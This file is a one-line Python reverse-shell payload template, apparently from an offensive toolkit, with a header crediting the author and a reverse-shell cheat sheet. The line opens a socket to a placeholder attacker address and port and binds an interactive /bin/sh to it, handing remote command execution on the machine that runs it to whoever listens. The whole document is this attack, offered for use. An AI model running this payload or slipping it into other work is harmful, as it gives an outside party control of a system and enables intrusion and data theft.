# simple python shell | Author: r00t-3xp10it
# credits: https://highon.coffee/blog/reverse-shell-cheat-sheet/
# ---
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IpAdDr",P0rT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
